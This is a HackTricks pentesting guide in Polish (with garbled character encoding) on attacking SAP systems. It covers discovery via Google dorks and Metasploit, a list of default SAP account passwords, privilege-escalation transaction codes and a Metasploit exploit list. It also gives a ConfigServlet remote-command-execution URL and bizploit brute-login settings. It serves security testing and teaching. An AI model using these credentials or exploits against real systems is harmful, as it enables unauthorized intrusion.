<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


# Wprowadzenie do SAP

SAP oznacza Systemy, Aplikacje i Produkty w Przetwarzaniu Danych. SAP, z definicji, jest rÃ³wnieÅ¼ nazwÄ… oprogramowania ERP \(Enterprise Resource Planning\) oraz nazwÄ… firmy.
System SAP skÅ‚ada siÄ™ z wielu w peÅ‚ni zintegrowanych moduÅ‚Ã³w, ktÃ³re obejmujÄ… praktycznie kaÅ¼dy aspekt zarzÄ…dzania biznesem.

KaÅ¼da instancja SAP \(lub SID\) skÅ‚ada siÄ™ z trzech warstw: bazy danych, aplikacji i prezentacji\), kaÅ¼dy krajobraz zwykle skÅ‚ada siÄ™ z czterech instancji: dev, test, QA i produkcja.
KaÅ¼da z warstw moÅ¼e byÄ‡ w pewnym stopniu wykorzystana, ale najwiÄ™kszy efekt moÅ¼na osiÄ…gnÄ…Ä‡, **atakujÄ…c bazÄ™ danych**.

KaÅ¼da instancja SAP jest podzielona na klientÃ³w. KaÅ¼dy z nich ma uÅ¼ytkownika SAP\*, odpowiednik "root" aplikacji.
Po poczÄ…tkowym utworzeniu, uÅ¼ytkownik SAP\* otrzymuje domyÅ›lne hasÅ‚o: "060719992" \(wiÄ™cej domyÅ›lnych haseÅ‚ poniÅ¼ej\).
ByÅ‚byÅ› zaskoczony, gdybyÅ› wiedziaÅ‚, jak czÄ™sto te **hasÅ‚a nie sÄ… zmieniane w Å›rodowiskach testowych lub deweloperskich**!

SprÃ³buj uzyskaÄ‡ dostÄ™p do powÅ‚oki dowolnego serwera, uÅ¼ywajÄ…c nazwy uÅ¼ytkownika &lt;SID&gt;adm.
Atak siÅ‚owy moÅ¼e pomÃ³c, jednak moÅ¼e wystÄ™powaÄ‡ mechanizm blokady konta.

# Odkrywanie

> NastÄ™pna sekcja pochodzi gÅ‚Ã³wnie z [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures) od uÅ¼ytkownika shipcod3!

* SprawdÅº zakres aplikacji lub krÃ³tki opis programu do testowania. Zanotuj nazwy hostÃ³w lub instancje systemowe do poÅ‚Ä…czenia z SAP GUI.
* Wykorzystaj OSINT \(open source intelligence\), Shodan i Google Dorks, aby sprawdziÄ‡ pliki, subdomeny i cenne informacje, jeÅ›li aplikacja jest dostÄ™pna przez Internet lub publicznie:
```text
inurl:50000/irj/portal
inurl:IciEventService/IciEventConf
inurl:/wsnavigator/jsps/test.jsp
inurl:/irj/go/km/docs/
https://www.shodan.io/search?query=sap+portal
https://www.shodan.io/search?query=SAP+Netweaver
https://www.shodan.io/search?query=SAP+J2EE+Engine
```
* Oto jak wyglÄ…da [http://SAP:50000/irj/portal](http://sap:50000/irj/portal)

![Ekran logowania SAP](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap%20logon.jpeg)

* UÅ¼yj nmap do sprawdzenia otwartych portÃ³w i znanych usÅ‚ug (routery sap, webdynpro, usÅ‚ugi sieciowe, serwery WWW, itp.)
* Przeszukaj adresy URL, jeÅ›li dziaÅ‚a na nich serwer WWW.
* PrzeprowadÅº fuzzing katalogÃ³w (moÅ¼esz uÅ¼yÄ‡ narzÄ™dzia Burp Intruder), jeÅ›li na okreÅ›lonych portach dziaÅ‚a serwer WWW. Oto kilka dobrych list sÅ‚Ã³w dostarczonych przez projekt SecLists do znajdowania domyÅ›lnych Å›cieÅ¼ek SAP ICM oraz innych interesujÄ…cych katalogÃ³w lub plikÃ³w:

[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls\_SAP.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-SAP.txt)
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt)
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt)

* UÅ¼yj pomocniczego moduÅ‚u Metasploit SAP SERVICE DISCOVERY do wyliczania instancji/usÅ‚ug/komponentÃ³w SAP:
```text
msf > use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > show options
Module options (auxiliary/scanner/sap/sap_service_discovery):
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-01            yes       Instance numbers to scan (e.g. 00-05,00-99)
RHOSTS                        yes       The target address range or CIDR identifier
THREADS      1                yes       The number of concurrent threads
TIMEOUT      1000             yes       The socket connect timeout in milliseconds
msf auxiliary(sap_service_discovery) > set rhosts 192.168.96.101
rhosts => 192.168.96.101
msf auxiliary(sap_service_discovery) > run
[*] 192.168.96.101:       - [SAP] Beginning service Discovery '192.168.96.101'
```
## Testowanie klienta Thick / SAP GUI

Oto polecenie do poÅ‚Ä…czenia siÄ™ z SAP GUI:
`sapgui <nazwa hosta serwera SAP> <numer systemu>`

* SprawdÅº domyÅ›lne dane uwierzytelniania \(W klasyfikacji podatnoÅ›ci Bugcrowd, jest to uwaÅ¼ane za P1 -&gt; BÅ‚Ä™dna konfiguracja zabezpieczeÅ„ serwera \| UÅ¼ywanie domyÅ›lnych danych uwierzytelniania \| Serwer produkcyjny\):
```text
# SAP* - High privileges - Hardcoded kernel user
SAP*:06071992:*
SAP*:PASS:*
# IDEADM - High Privileges - Only in IDES systems
IDEADM:admin:*
# DDIC - High privileges - User has SAP_ALL
DDIC:19920706:000,001
# EARLYWATCH - High privileges
EARLYWATCH:SUPPORT:066
# TMSADM - Medium privileges
TMSADM:PASSWORD:000
TMSADM:$1Pawd2&:000
# SAPCPIC - Medium privileges
SAPCPIC:ADMIN:000,001
# SOLMAN dialog default users and passwords.
# For more info check:
# https://www.troopers.de/media/filer_public/37/34/3734ebb3-989c-4750-9d48-ea478674991a/an_easy_way_into_your_sap_systems_v30.pdf
# https://launchpad.support.sap.com/#/notes/2293011
# SOLMAN_ADMIN - High privileges - Only on SOLMAN systems
SOLMAN_ADMIN:init1234:*
# SAPSUPPORT - High privileges - Only on SOLMAN or satellite systems
SAPSUPPORT:init1234:*
# SOLMAN<SID><CLNT> - High privileges - Only on SOLMAN systems
#SOLMAN<SID><CLNT>:init1234:*
# Trial systems
# -------------
# AS ABAP 7.40 SP08 Developer Edition:
# https://blogs.sap.com/2015/10/14/sap-netweaver-as-abap-740-sp8-developer-edition-to-download-consise-installation-instruction/
DDIC:DidNPLpw2014:001
SAP*:DidNPLpw2014:001
DEVELOPER:abCd1234:001
BWDEVELOPER:abCd1234:001
# AS ABAP 7.50 SP02 Developer Edition:
# https://blogs.sap.com/2016/11/03/sap-nw-as-abap-7.50-sp2-developer-edition-to-download-consise-installation-guide/
# AS ABAP 7.51 SP02 Developer Edition:
# https://blogs.sap.com/2017/09/04/sap-as-abap-7.51-sp2-developer-edition-to-download-concise-installation-guide/
DDIC:Appl1ance:000,001
SAP*:Appl1ance:000,001
DEVELOPER:Appl1ance:001
BWDEVELOPER:Appl1ance:001
# AS ABAP 7.51 SP01 Developer Edition:
# https://blogs.sap.com/2018/09/13/as-abap-7.52-sp01-developer-edition-concise-installation-guide/
# AS ABAP 7.52 SP04 Developer Edition:
# https://blogs.sap.com/2019/10/01/as-abap-7.52-sp04-developer-edition-concise-installation-guide/
DDIC:Down1oad:000,001
SAP*:Down1oad:000,001
DEVELOPER:Down1oad:001
BWDEVELOPER:Down1oad:001
```
* Uruchom Wireshark, a nastÄ™pnie uwierzytelnij siÄ™ do klienta (SAP GUI) przy uÅ¼yciu otrzymanych poÅ›wiadczeÅ„, poniewaÅ¼ niektÃ³re klienty przesyÅ‚ajÄ… poÅ›wiadczenia bez SSL. IstniejÄ… dwa znane wtyczki dla Wiresharka, ktÃ³re mogÄ… analizowaÄ‡ gÅ‚Ã³wne nagÅ‚Ã³wki uÅ¼ywane przez protokÃ³Å‚ SAP DIAG: wtyczka do analizy SAP SecureAuth Labs i wtyczka SAP DIAG od Positive Research Center.
* SprawdÅº, czy istniejÄ… eskalacje uprawnieÅ„, takie jak korzystanie z niektÃ³rych kodÃ³w transakcji SAP (tcodes) dla uÅ¼ytkownikÃ³w o niskich uprawnieniach:
* SU01 - Do tworzenia i zarzÄ…dzania uÅ¼ytkownikami
* SU01D - Do wyÅ›wietlania uÅ¼ytkownikÃ³w
* SU10 - Do masowej konserwacji
* SU02 - Do rÄ™cznego tworzenia profili
* SM19 - Audyt bezpieczeÅ„stwa - konfiguracja
* SE84 - System informacyjny dla uprawnieÅ„ SAP R/3
* SprawdÅº, czy moÅ¼na wykonywaÄ‡ polecenia systemowe / uruchamiaÄ‡ skrypty w kliencie.
* SprawdÅº, czy moÅ¼na przeprowadziÄ‡ atak XSS na eksploratorze BAPI.

# Testowanie interfejsu sieciowego

* Przeszukaj adresy URL (patrz faza odkrywania).
* PrzeprowadÅº testy fuzzingowe na adresach URL, podobnie jak w fazie odkrywania. Oto jak wyglÄ…da [http://SAP:50000/index.html](http://sap:50000/index.html):

![Strona gÅ‚Ã³wna SAP](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/index.jpeg)

* Szukaj powszechnych podatnoÅ›ci internetowych (odwoÅ‚aj siÄ™ do OWASP Top 10), poniewaÅ¼ w niektÃ³rych miejscach wystÄ™pujÄ… podatnoÅ›ci XSS, RCE, XXE, itp.
* SprawdÅº metodologiÄ™ Jasona Haddixa [â€Metodologia Å‚owcÃ³w bÅ‚Ä™dÃ³wâ€](https://github.com/jhaddix/tbhm) do testowania podatnoÅ›ci internetowych.
* Autoryzacja omijajÄ…ca za pomocÄ… manipulacji werbami? ByÄ‡ moÅ¼e :)
* OtwÃ³rz `http://SAP:50000/webdynpro/resources/sap.com/XXX/JWFTestAddAssignees#`, a nastÄ™pnie kliknij przycisk â€Chooseâ€, a nastÄ™pnie w otwartym oknie naciÅ›nij â€Searchâ€. PowinieneÅ› zobaczyÄ‡ listÄ™ uÅ¼ytkownikÃ³w SAP (Referencja podatnoÅ›ci: [ERPSCAN-16-010](https://erpscan.com/advisories/erpscan-16-010-sap-netweaver-7-4-information-disclosure/))
* Czy poÅ›wiadczenia sÄ… przesyÅ‚ane przez HTTP? JeÅ›li tak, jest to uwaÅ¼ane za P3 zgodnie z [TaxonomiÄ… oceny podatnoÅ›ci](https://bugcrowd.com/vulnerability-rating-taxonomy) Bugcrowd: Uszkodzona autoryzacja i zarzÄ…dzanie sesjÄ… \| SÅ‚abe funkcje logowania przez HTTP. WskazÃ³wka: SprawdÅº rÃ³wnieÅ¼ [http://SAP:50000/startPage](http://sap:50000/startPage) lub portale logowania :)

![Strona startowa SAP](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/startPage.jpeg)

* SprÃ³buj `/irj/go/km/navigation/` dla moÅ¼liwego wyÅ›wietlania katalogu lub omijania uwierzytelniania
* [http://SAP/sap/public/info](http://sap/sap/public/info) zawiera pewne cenne informacje:
```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>
<rfc:RFC_SYSTEM_INFO.Response xmlns:rfc="urn:sap-com:document:sap:rfc:functions">
<RFCSI>
<RFCPROTO>011</RFCPROTO>
<RFCCHARTYP>4102</RFCCHARTYP>
<RFCINTTYP>BIG</RFCINTTYP>
<RFCFLOTYP>IE3</RFCFLOTYP>
<RFCDEST>randomnum</RFCDEST>
<RFCHOST>randomnum</RFCHOST>
<RFCSYSID>BRQ</RFCSYSID>
<RFCDATABS>BRQ</RFCDATABS>
<RFCDBHOST>randomnum</RFCDBHOST>
<RFCDBSYS>ORACLE</RFCDBSYS>
<RFCSAPRL>740</RFCSAPRL>
<RFCMACH>324</RFCMACH>
<RFCOPSYS>AIX</RFCOPSYS>
<RFCTZONE>-25200</RFCTZONE>
<RFCDAYST/>
<RFCIPADDR>192.168.1.8</RFCIPADDR>
<RFCKERNRL>749</RFCKERNRL>
<RFCHOST2>randomnum</RFCHOST2>
<RFCSI_RESV/>
<RFCIPV6ADDR>192.168.1.8</RFCIPV6ADDR>
</RFCSI>
</rfc:RFC_SYSTEM_INFO.Response>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
# Atak!

* SprawdÅº, czy dziaÅ‚a na starych serwerach lub technologiach, takich jak Windows 2000.
* Zaplanuj moÅ¼liwe wykorzystania / ataki, istnieje wiele moduÅ‚Ã³w Metasploit do odkrywania SAP \(moduÅ‚y pomocnicze\) i wykorzystaÅ„:
```text
msf > search sap
Matching Modules
================
Name                                                                     Disclosure Date  Rank       Description
----                                                                     ---------------  ----       -----------
auxiliary/admin/maxdb/maxdb_cons_exec                                    2008-01-09       normal     SAP MaxDB cons.exe Remote Command Injection
auxiliary/admin/sap/sap_configservlet_exec_noauth                        2012-11-01       normal     SAP ConfigServlet OS Command Execution
auxiliary/admin/sap/sap_mgmt_con_osexec                                                   normal     SAP Management Console OSExecute
auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                            normal     SAP SOAP EPS_DELETE_FILE File Deletion
auxiliary/dos/windows/http/pi3web_isapi                                  2008-11-13       normal     Pi3Web ISAPI DoS
auxiliary/dos/windows/llmnr/ms11_030_dnsapi                              2011-04-12       normal     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS
auxiliary/scanner/http/sap_businessobjects_user_brute                                     normal     SAP BusinessObjects User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_brute_web                                 normal     SAP BusinessObjects Web User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_enum                                      normal     SAP BusinessObjects User Enumeration
auxiliary/scanner/http/sap_businessobjects_version_enum                                   normal     SAP BusinessObjects Version Detection
auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt                                    normal     SAP CTC Service Verb Tampering User Management
auxiliary/scanner/sap/sap_hostctrl_getcomputersystem                                      normal     SAP Host Agent Information Disclosure
auxiliary/scanner/sap/sap_icf_public_info                                                 normal     SAP ICF /sap/public/info Service Sensitive Information Gathering
auxiliary/scanner/sap/sap_icm_urlscan                                                     normal     SAP URL Scanner
auxiliary/scanner/sap/sap_mgmt_con_abaplog                                                normal     SAP Management Console ABAP Syslog Disclosure
auxiliary/scanner/sap/sap_mgmt_con_brute_login                                            normal     SAP Management Console Brute Force
auxiliary/scanner/sap/sap_mgmt_con_extractusers                                           normal     SAP Management Console Extract Users
auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints                                        normal     SAP Management Console Get Access Points
auxiliary/scanner/sap/sap_mgmt_con_getenv                                                 normal     SAP Management Console getEnvironment
auxiliary/scanner/sap/sap_mgmt_con_getlogfiles                                            normal     SAP Management Console Get Logfile
auxiliary/scanner/sap/sap_mgmt_con_getprocesslist                                         normal     SAP Management Console GetProcessList
auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter                                    normal     SAP Management Console Get Process Parameters
auxiliary/scanner/sap/sap_mgmt_con_instanceproperties                                     normal     SAP Management Console Instance Properties
auxiliary/scanner/sap/sap_mgmt_con_listlogfiles                                           normal     SAP Management Console List Logfiles
auxiliary/scanner/sap/sap_mgmt_con_startprofile                                           normal     SAP Management Console getStartProfile
auxiliary/scanner/sap/sap_mgmt_con_version                                                normal     SAP Management Console Version Detection
auxiliary/scanner/sap/sap_router_info_request                                             normal     SAPRouter Admin Request
auxiliary/scanner/sap/sap_router_portscanner                                              normal     SAPRouter Port Scanner
auxiliary/scanner/sap/sap_service_discovery                                               normal     SAP Service Discovery
auxiliary/scanner/sap/sap_smb_relay                                                       normal     SAP SMB Relay Abuse
auxiliary/scanner/sap/sap_soap_bapi_user_create1                                          normal     SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_brute_login                                            normal     SAP SOAP Service RFC_PING Login Brute Forcer
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec                   normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec                               normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                              normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                            normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
auxiliary/scanner/sap/sap_soap_rfc_ping                                                   normal     SAP /sap/bc/soap/rfc SOAP Service RFC_PING Function Service Discovery
auxiliary/scanner/sap/sap_soap_rfc_read_table                                             normal     SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data
auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                           normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface                                normal     SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec                                  normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution
auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec                                      normal     SAP SOAP RFC SXPG_COMMAND_EXECUTE
auxiliary/scanner/sap/sap_soap_rfc_system_info                                            normal     SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering
auxiliary/scanner/sap/sap_soap_th_saprel_disclosure                                       normal     SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure
auxiliary/scanner/sap/sap_web_gui_brute_login                                             normal     SAP Web GUI Login Brute Forcer
exploit/multi/sap/sap_mgmt_con_osexec_payload                            2011-03-08       excellent  SAP Management Console OSExecute Payload Execution
exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                     2013-03-26       great      SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                         2012-05-08       great      SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
exploit/windows/browser/enjoysapgui_comp_download                        2009-04-15       excellent  EnjoySAP SAP GUI ActiveX Control Arbitrary File Download
exploit/windows/browser/enjoysapgui_preparetoposthtml                    2007-07-05       normal     EnjoySAP SAP GUI ActiveX Control Buffer Overflow
exploit/windows/browser/sapgui_saveviewtosessionfile                     2009-03-31       normal     SAP AG SAPgui EAI WebViewer3D Buffer Overflow
exploit/windows/http/sap_configservlet_exec_noauth                       2012-11-01       great      SAP ConfigServlet Remote Code Execution
exploit/windows/http/sap_host_control_cmd_exec                           2012-08-14       average    SAP NetWeaver HostControl Command Injection
exploit/windows/http/sapdb_webtools                                      2007-07-05       great      SAP DB 7.4 WebTools Buffer Overflow
exploit/windows/lpd/saplpd                                               2008-02-04       good       SAP SAPLPD 6.28 Buffer Overflow
exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow
```
* SprÃ³buj uÅ¼yÄ‡ znanych exploitÃ³w (sprawdÅº Exploit-DB) lub atakÃ³w, takich jak stary, ale dobry "SAP ConfigServlet Remote Code Execution" w portalu SAP:
```text
http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
```
![SAP Config Servlet RCE](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap_rce.jpeg)

* Przed uruchomieniem polecenia `start` w skrypcie bizploit w fazie Discovery, moÅ¼esz rÃ³wnieÅ¼ dodaÄ‡ nastÄ™pujÄ…ce polecenie w celu przeprowadzenia oceny podatnoÅ›ci:
```text
bizploit> plugins
bizploit/plugins> vulnassess all
bizploit/plugins> vulnassess config bruteLogin
bizploit/plugins/vulnassess/config:bruteLogin> set type defaultUsers
bizploit/plugins/vulnassess/config:bruteLogin> set tryHardcodedSAPStar True
bizploit/plugins/vulnassess/config:bruteLogin> set tryUserAsPwd True
bizploit/plugins/vulnassess/config:bruteLogin> back
bizploit/plugins> vulnassess config registerExtServer
bizploit/plugins/vulnassess/config:registerExtServer> set tpname evilgw
bizploit/plugins/vulnassess/config:registerExtServer> back
bizploit/plugins> vulnassess config checkRFCPrivs
bizploit/plugins/vulnassess/config:checkRFCPrivs> set checkExtOSCommands True
bizploit/plugins/vulnassess/config:checkRFCPrivs> back
bizploit/plugins> vulnassess config icmAdmin
bizploit/plugins/vulnassess/config:icmAdmin> set adminURL /sap/admin
bizploit/plugins/vulnassess/config:icmAdmin> back
bizploit/plugins> start
bizploit/plugins> back
bizploit> start
```
# Inne przydatne narzÄ™dzia do testowania

* [PowerSAP](https://github.com/airbus-seclab/powersap) - narzÄ™dzie Powershell do oceny bezpieczeÅ„stwa SAP
* [Burp Suite](https://portswigger.net/burp) - niezbÄ™dne narzÄ™dzie do fuzzingu katalogÃ³w i oceny bezpieczeÅ„stwa aplikacji internetowych
* [pysap](https://github.com/SecureAuthCorp/pysap) - biblioteka Python do tworzenia pakietÃ³w protokoÅ‚u sieciowego SAP
* [https://github.com/gelim/nmap-erpscan](https://github.com/gelim/nmap-erpscan) - pomaga nmap w wykrywaniu SAP/ERP

## OdwoÅ‚ania

* [Testowanie penetracyjne SAP przy uÅ¼yciu Metasploit](http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf)
* [https://github.com/davehardy20/SAP-Stuff](https://github.com/davehardy20/SAP-Stuff) - skrypt do pÃ³Å‚automatyzacji Bizploit
* [Konfiguracja zabezpieczeÅ„ SAP NetWeaver ABAP, czÄ™Å›Ä‡ 3: DomyÅ›lne hasÅ‚a dostÄ™pu do aplikacji](https://erpscan.com/press-center/blog/sap-netweaver-abap-security-configuration-part-2-default-passwords-for-access-to-the-application/)
* [Lista kodÃ³w transakcji ABAP zwiÄ…zanych z bezpieczeÅ„stwem SAP](https://wiki.scn.sap.com/wiki/display/Security/List+of+ABAP-transaction+codes+related+to+SAP+security)
* [Atakowanie portalu SAP](https://erpscan.com/wp-content/uploads/presentations/2012-HackerHalted-Breaking-SAP-Portal.pdf)
* [10 najciekawszych podatnoÅ›ci i atakÃ³w na SAP](https://erpscan.com/wp-content/uploads/presentations/2012-Kuwait-InfoSecurity-Top-10-most-interesting-vulnerabilities-and-attacks-in-SAP.pdf)
* [Ocena bezpieczeÅ„stwa ekosystemÃ³w SAP za pomocÄ… bizploit: Odkrywanie](https://www.onapsis.com/blog/assessing-security-sap-ecosystems-bizploit-discovery)
* [https://www.exploit-db.com/docs/43859](https://www.exploit-db.com/docs/43859)
* [https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/](https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/)
* [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures)



<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
